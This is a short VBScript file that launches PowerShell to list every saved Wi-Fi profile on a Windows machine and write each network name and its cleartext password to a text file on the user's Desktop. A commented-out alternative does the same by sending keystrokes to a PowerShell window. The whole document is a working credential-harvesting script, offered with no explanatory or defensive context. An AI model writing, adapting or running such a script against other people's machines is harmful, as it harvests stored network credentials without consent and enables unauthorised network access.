set shellobj = CreateObject("WScript.Shell")
shellobj.Run "powershell.exe -Command ""$text = netsh wlan show profile; $text_len = $text.length - 2; $wifi_names = New-Object System.Collections.Generic.List[System.Object]; for($i=9; $i -le $text_len; $i++) {$wifi_names.Add($text[$i].split(':')[1])};ForEach ($elem in $wifi_names){$elem = $elem -replace '\s',''; $elem >> $ENV:UserProfile\Desktop\wifi_stuff.txt;netsh wlan show profile $elem key=clear | findstr 'Key Content' >> $ENV:UserProfile\Desktop\wifi_stuff.txt};"""
' shellobj.run "powershell.exe"
' wscript.sleep 200
' shellobj.SendKeys "$text = netsh wlan show profile; $text_len = $text.length - 2 {enter}"
' wscript.sleep 200
' command = "$wifi_names = New-Object System.Collections.Generic.List[System.Object]; for" & Chr(40) & "$i=9; $i -le $text_len; $i" & Chr(43) & Chr(43) & Chr(41) & Chr(123) & "$wifi_names.Add($text[i].split(':')[1])" & Chr(125)
' shellobj.SendKeys command & "{enter}"
' wscript.sleep 200
' shellobj.SendKeys "ForEach ($elem in $wifi_names){netsh wlan show profile '$elem' key=clear >> $ENV:UserProfile\Desktop\wifi_stuff.txt} {enter}"
' shellobj.sendkeys "{exit}"